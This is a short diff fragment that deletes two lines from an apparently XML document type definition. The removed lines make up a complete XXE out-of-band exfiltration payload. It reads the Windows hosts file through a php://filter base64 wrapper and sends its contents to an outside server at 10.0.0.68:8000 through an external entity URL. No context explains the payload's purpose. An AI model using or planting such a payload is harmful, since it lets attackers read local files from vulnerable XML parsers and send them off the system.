@@ -1,2 +1,0 @@
-<!ENTITY % stuff SYSTEM "php://filter/read=convert.base64-encode/resource=file:///WINDOWS/system32/drivers/etc/hosts">
-<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://10.0.0.68:8000/?data=%stuff;'>">
